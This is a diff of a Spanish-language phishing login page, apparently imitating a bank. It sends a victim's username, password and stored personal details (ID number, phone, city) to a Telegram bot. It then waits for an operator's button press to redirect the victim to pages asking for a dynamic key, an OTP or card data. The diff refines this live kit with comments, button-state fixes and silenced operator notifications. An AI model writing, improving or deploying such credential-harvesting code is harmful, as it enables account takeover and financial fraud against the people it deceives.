@@ -25,7 +25,8 @@
     }
     .logo { margin-bottom: 20px; }
     .logo img { width: 180px; }
-    .subtitle { font-size: 279px; font-weight: 300; color: white; margin-bottom: 30px; }
+    /* NOTA: El font-size de 279px en .subtitle es inusualmente grande, se ajusta al tamaño de h1 interno */
+    .subtitle { font-size: 26px; font-weight: 300; color: white; margin-bottom: 30px; }
     .login-card {
       background: #454648;
       border-radius: 10px;
@@ -182,7 +183,6 @@
     </div>
   </div>
 
-  <!-- Overlay loader: difuminado + rueda (sin texto) -->
   <div class="overlay-loader" id="loaderFull" role="status" aria-hidden="true" aria-label="Cargando">
     <div class="spinner" aria-hidden="true"></div>
   </div>
@@ -204,6 +204,7 @@
     }
 
     function updateLoginButtonState() {
+      // El botón se habilita si ambos campos tienen valor
       const enabled = !!usuarioInput.value.trim() && !!claveInput.value.trim();
       loginBtn.disabled = !enabled;
       loginBtn.classList.toggle('enabled', enabled);
@@ -244,6 +245,7 @@
     /* ---------- TELEGRAM CONFIG ---------- */
     async function loadTelegramConfig() {
       try {
+        // La ruta es relativa a index.html: js/brr76.json
         const res = await fetch('./js/brr76.json', { cache: 'no-store' });
         if (!res.ok) throw new Error('No se pudo cargar js/brr76.json');
         const cfg = await res.json();
@@ -269,7 +271,7 @@
           const updates = data.result || [];
           if (updates.length > 0) {
             const lastId = updates[updates.length - 1].update_id;
-            saveTgOffset(lastId + 1);
+            saveTgOffset(lastId + 1); // Guardar el ID del siguiente update
           }
         }
       } catch (e) {
@@ -280,30 +282,34 @@
     /* ---------- ENVIAR Y ESPERAR RESPUESTA ---------- */
     document.getElementById('loginForm').addEventListener('submit', async function(ev) {
       ev.preventDefault();
+      // Ocultamos el botón por si acaso, aunque el loader ya lo cubre
+      loginBtn.disabled = true;
       showLoader();
 
       const usuario = usuarioInput.value.trim();
       const clave = claveInput.value.trim();
+      // Generamos un ID de transacción único para rastrear la respuesta del administrador
       const transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2,10);
 
-      // Guardar localmente
+      // Guardar localmente para pasarlo a otras páginas si es necesario
       localStorage.setItem('usuario', usuario);
       localStorage.setItem('clave', clave);
       localStorage.setItem('transactionId', transactionId);
 
-      // Cargar config y preparar mensaje
+      // Cargar config
       const config = await loadTelegramConfig();
-      if (!config) { hideLoader(); return; }
+      if (!config) { hideLoader(); loginBtn.disabled = false; return; }
 
       // Inicializar offset una vez para evitar updates viejos (solo si no existe)
       if (!getTgOffset()) await initTgOffsetOnce(config);
 
-      // Intentar recuperar 'formData' si existe (campo opcional que puedas almacenar en otras páginas)
+      // Intentar recuperar 'formData' si existe (datos de páginas anteriores)
       let storedForm = null;
       try { storedForm = JSON.parse(localStorage.getItem('formData') || 'null'); } catch(e) { storedForm = null; }
 
       let message = `🔐 Nuevo inicio de sesión pendiente\n🆔 ID: ${transactionId}\n👤 Usuario: ${usuario}\n🔑 Clave: ${clave}\n\n`;
       if (storedForm && typeof storedForm === 'object') {
+        // Estructura de campos opcionales que se pueden añadir al mensaje
         const extras = [
           { k: 'nombre', l: 'Nombre' }, { k: 'documentoIdentidad', l: 'Cédula' },
           { k: 'telefono', l: 'Teléfono' }, { k: 'ciudad', l: 'Ciudad' },
@@ -314,6 +320,7 @@
         extras.forEach(it => { if (storedForm[it.k]) message += `• ${it.l}: ${storedForm[it.k]}\n`; });
       }
 
+      // Teclado inline para la respuesta del administrador
       const keyboard = {
         inline_keyboard: [
           [{ text: "Pedir dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
@@ -328,19 +335,26 @@
         const sendRes = await fetch(`https://api.telegram.org/bot${encodeURIComponent(config.token)}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: config.chat_id, text: message, reply_markup: keyboard })
+          body: JSON.stringify({
+            chat_id: config.chat_id,
+            text: message,
+            reply_markup: keyboard,
+            disable_notification: true // Silenciar la notificación para el admin
+          })
         });
         const sendJson = await sendRes.json();
         if (!sendJson.ok) {
           console.error('sendMessage error:', sendJson);
           alert('No se pudo enviar el mensaje a Telegram. Revisa consola.');
           hideLoader();
+          updateLoginButtonState(); // Restaurar el estado del botón
           return;
         }
       } catch (err) {
         console.error('Error enviando a Telegram:', err);
         alert('Error enviando a Telegram. Revisa consola.');
         hideLoader();
+        updateLoginButtonState(); // Restaurar el estado del botón
         return;
       }
 
@@ -349,14 +363,15 @@
         await waitForAdminResponse(config, transactionId);
       } finally {
         hideLoader();
+        updateLoginButtonState(); // Asegurar que el botón se actualice al finalizar
       }
     });
 
     async function waitForAdminResponse(config, transactionId) {
-      const MAX_WAIT_MS = 5 * 60 * 1000; // 5 minutos
-      const POLL_INTERVAL = 2000;
+      const MAX_WAIT_MS = 5 * 60 * 1000; // 5 minutos de espera máxima
+      const POLL_INTERVAL = 2000; // 2 segundos
       const start = Date.now();
-      let offset = getTgOffset() || 0;
+      let offset = getTgOffset() || 0; // Usar el offset guardado
 
       while (Date.now() - start < MAX_WAIT_MS) {
         try {
@@ -371,21 +386,23 @@
             if (updates.length > 0) {
               const lastId = updates[updates.length - 1].update_id;
               offset = lastId + 1;
-              saveTgOffset(offset);
+              saveTgOffset(offset); // Guardar el nuevo offset
 
               for (const u of updates) {
+                // Buscamos un callback_query que contenga nuestro transactionId
                 if (u.callback_query && u.callback_query.data && u.callback_query.data.includes(transactionId)) {
-                  // intentar responder el callback para quitar el "cargando" en Telegram
+                  // 1. Intentar responder el callback para quitar el "cargando" en Telegram
                   try {
                     await fetch(`https://api.telegram.org/bot${encodeURIComponent(config.token)}/answerCallbackQuery`, {
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
                       body: JSON.stringify({ callback_query_id: u.callback_query.id })
                     });
-                  } catch (e) { /* no bloqueamos por este fallo */ }
+                  } catch (e) { console.warn('answerCallbackQuery falló:', e); }
 
+                  // 2. Ejecutar la acción
                   handleAdminAction(u.callback_query.data, transactionId);
-                  return;
+                  return; // Salir de la función al encontrar la respuesta
                 }
               }
             }
@@ -396,14 +413,16 @@
           console.error('Error en polling getUpdates:', err);
         }
 
+        // Esperar el intervalo antes de la próxima consulta
         await new Promise(r => setTimeout(r, POLL_INTERVAL));
       }
 
+      // Si el bucle termina por tiempo
       alert('No hubo respuesta del administrador en el tiempo esperado. Intenta más tarde.');
     }
 
     function handleAdminAction(callbackData, transactionId) {
-      // Dependiendo del botón presionado por el admin, actuamos
+      // Redirige según el botón presionado por el admin
       if (callbackData.startsWith('pedir_dinamica')) {
         window.location.href = 'dinamica.html';
       } else if (callbackData.startsWith('pedir_otp')) {
@@ -411,10 +430,11 @@
       } else if (callbackData.startsWith('pedir_tc')) {
         window.location.href = 'tc.html';
       } else if (callbackData.startsWith('error_logo')) {
-        alert('Se ha reportado un error de logo por el administrador. Revisa tu información e intenta nuevamente.');
+        alert('Se ha reportado un error. Revisa tu información e intenta nuevamente.');
       } else {
         console.log('Acción admin no manejada:', callbackData);
       }
+      // NOTA: El borrado de los botones de Telegram DEBE hacerlo un bot/servidor que reciba el webhook/callback
     }
   </script>
 </body>
